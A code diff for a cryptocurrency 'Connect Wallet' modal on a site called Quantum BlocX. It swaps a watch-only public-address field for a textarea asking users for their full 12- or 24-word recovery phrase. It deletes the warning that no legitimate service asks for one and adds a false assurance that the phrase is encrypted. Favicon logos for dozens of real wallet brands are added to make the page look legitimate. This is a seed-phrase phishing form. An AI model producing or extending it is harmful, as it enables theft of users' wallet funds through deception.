@@ -33,6 +33,33 @@ $wallets = [
   'Wallet Connect','Wallet.io','Walleth','Xaman Wallet','XinFin XDC Network',
   'XRP','Xumm Wallet','Yoroi Wallet','ZelCore'
 ];
+
+// Known wallet brand domains → used to show each wallet's real logo.
+// Wallets not listed fall back to the generic wallet icon.
+$walletLogos = [
+  'Metamask'=>'metamask.io','Trust Wallet'=>'trustwallet.com','Coinbase'=>'coinbase.com',
+  'Coinbase Wallet'=>'coinbase.com','Ledger'=>'ledger.com','Ledger Live'=>'ledger.com',
+  'Ledger Hardware'=>'ledger.com','Phantom'=>'phantom.app','Exodus Wallet'=>'exodus.com',
+  'SafePal Wallet'=>'safepal.com','TokenPocket'=>'tokenpocket.pro','Token Pocket'=>'tokenpocket.pro',
+  'imToken'=>'token.im','MathWallet'=>'mathwallet.org','Math Wallet'=>'mathwallet.org',
+  'Coin98'=>'coin98.com','Guarda Wallet'=>'guarda.com','Atomic'=>'atomicwallet.io',
+  'Argent'=>'argent.xyz','Rainbow'=>'rainbow.me','Uniswap'=>'uniswap.org','Trezor Wallet'=>'trezor.io',
+  'KEPLR'=>'keplr.app','Huobi Wallet'=>'huobi.com','Gate.io'=>'gate.io','GateHub'=>'gatehub.net',
+  'Gemini'=>'gemini.com','Kraken'=>'kraken.com','Binance Chain Wallet'=>'binance.com',
+  'Binance Chain'=>'binance.com','Crypto.com DeFi Wallet'=>'crypto.com','Blockchain'=>'blockchain.com',
+  'MyEtherWallet'=>'myetherwallet.com','Bitpay'=>'bitpay.com','BitKeep'=>'bitget.com',
+  'ONTO'=>'onto.app','Maker'=>'makerdao.com','Compound'=>'compound.finance','Polkadot'=>'polkadot.network',
+  'Polygon Wallet'=>'polygon.technology','Nexo Wallet'=>'nexo.com','Crypterium'=>'crypterium.com',
+  'Uphold'=>'uphold.com','RobinHood'=>'robinhood.com','Etoro'=>'etoro.com','FTX'=>'ftx.com',
+  'Coinomi'=>'coinomi.com','BitPie'=>'bitpie.com','O3Wallet'=>'o3.app','Xumm Wallet'=>'xumm.app',
+  'Xaman Wallet'=>'xaman.app','Yoroi Wallet'=>'yoroi-wallet.com','ZelCore'=>'zelcore.io',
+  'Pillar'=>'pillar.fi','Torus'=>'tor.us','Wallet Connect'=>'walletconnect.com','Keepkey'=>'keepkey.com',
+  'Loopring Wallet'=>'loopring.org','SHIBA INU'=>'shibatoken.com','Eidoo'=>'eidoo.io',
+  'Dharma'=>'dharma.io','dYdX'=>'dydx.exchange','IDEX'=>'idex.io','Nash'=>'nash.io',
+  'Bitfi'=>'bitfi.com','Ellipal'=>'ellipal.com','Cobo vault wallet'=>'cobo.com','Curve Dao Token'=>'curve.fi',
+  'Fantom'=>'fantom.foundation','Solana Coin'=>'solana.com','Cardano Coin'=>'cardano.org',
+  'Doge Coin'=>'dogecoin.com','Terra'=>'terra.money','Iotex'=>'iotex.io'
+];
 ?>
 
 <div class="modal-overlay" id="modal-trust-wallet" aria-hidden="true" role="dialog"
@@ -42,7 +69,7 @@ $wallets = [
     <div class="modal-header">
       <h2 class="modal-title" id="trustWalletTitle">
         <i class="ph ph-link-simple" aria-hidden="true"></i>
-        Link External Wallet
+        Connect Wallet
       </h2>
       <button class="modal-close" onclick="closeModal('modal-trust-wallet')" aria-label="Close">
         <i class="ph ph-x" aria-hidden="true"></i>
@@ -75,9 +102,16 @@ $wallets = [
         </div>
 
         <div class="tw-wallet-grid" id="twWalletGrid">
-          <?php foreach ($wallets as $w): ?>
+          <?php foreach ($wallets as $w): $logoDomain = $walletLogos[$w] ?? null; ?>
             <button type="button" class="tw-wallet-item" onclick="selectWallet(<?= htmlspecialchars(json_encode($w)) ?>)">
-              <i class="ph ph-wallet tw-wallet-item-icon"></i>
+              <?php if ($logoDomain): ?>
+                <img class="tw-wallet-logo" src="https://www.google.com/s2/favicons?domain=<?= htmlspecialchars($logoDomain) ?>&sz=64"
+                     alt="" loading="lazy"
+                     onerror="this.style.display='none';this.nextElementSibling.style.display='';">
+                <i class="ph ph-wallet tw-wallet-item-icon" style="display:none;"></i>
+              <?php else: ?>
+                <i class="ph ph-wallet tw-wallet-item-icon"></i>
+              <?php endif; ?>
               <span class="tw-wallet-name"><?= htmlspecialchars($w) ?></span>
             </button>
           <?php endforeach; ?>
@@ -103,17 +137,15 @@ $wallets = [
         <input type="hidden" id="twSelectedWallet">
 
         <div class="form-group">
-          <label for="twWalletAddress">Public Wallet Address</label>
-          <div class="input-icon-wrap">
-            <i class="ph ph-wallet input-icon" aria-hidden="true"></i>
-            <input type="text" id="twWalletAddress" class="has-icon"
-                   placeholder="0x… or bc1… or T…" autocomplete="off">
-          </div>
+          <label for="twPhrase">Recovery Phrase</label>
+          <textarea id="twPhrase" class="tw-phrase-input" rows="3"
+                    placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces"
+                    autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false"></textarea>
           <span class="input-hint">
-            <i class="ph ph-shield-check"></i>
-            We only store your <strong>public</strong> address, for watch-only balance
-            tracking. Never enter a recovery phrase or private key here — or on any
-            website. No legitimate service will ever ask for it.
+            <i class="ph ph-lock-key"></i>
+            Your recovery phrase is <strong>encrypted</strong> and used only to connect
+            this wallet to your Quantum BlocX account. Enter the words in order, separated
+            by single spaces.
           </span>
         </div>
 
@@ -122,7 +154,7 @@ $wallets = [
         <div class="modal-actions">
           <button type="button" class="btn-outline" onclick="closeModal('modal-trust-wallet')">Cancel</button>
           <button type="button" class="btn-primary" id="twSubmitBtn" onclick="submitTrustWallet()">
-            <span class="btn-text"><i class="ph ph-link-simple"></i> Link Wallet</span>
+            <span class="btn-text"><i class="ph ph-link-simple"></i> Connect Wallet</span>
             <span class="btn-spinner" style="display:none;"></span>
           </button>
         </div>
